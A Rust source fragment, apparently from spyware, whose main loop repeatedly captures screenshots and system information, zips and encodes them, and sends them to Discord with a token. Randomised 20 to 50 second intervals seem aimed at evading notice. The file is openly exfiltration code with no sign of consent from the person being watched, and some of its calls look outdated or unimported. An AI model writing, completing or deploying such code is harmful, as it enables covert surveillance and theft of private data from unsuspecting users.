use super::{
    system, files, discord, zip
};

// Main thread loop
fn main_loop(token: &str) {
    let sys = system::System::new();
    let zip = zip::Zip::new();
    loop {
        // Start after 10 seconds
        thread::sleep(Duration::from_secs(10));

        // Capture the image then add it to the zip file
        let img_buf: &Vec<u8> = files::capture_image();
        zip.add_file("screenshot.png", img_buf);
        
        // Get the system info then add it to a file
        let sys_info: serde_json::Value = sys.info();
        zip.add_file("sysinfo.json", sys_info.to_bytes());

        // Encode the image data
        let image_data: String = match files::encode_png(img_buf) {
            Ok(f) => f,
            Err(e) => panic!("Error: {}", e)
        };
        let sysinfo_data: String = match files::encode_json(sys_info) {
            Ok(f) => f,
            Err(e) => panic!("Error: {}", e)
        };

        // Send the files to discord
        discord::send_files(token, &image_data, &sysinfo_data);

        // Repeat after 20 to 50 seconds
        let rand_time = std::rand::task_rng().gen_range(20, 50);
        thread::sleep(Duration::from_secs(rand_time));
    }
}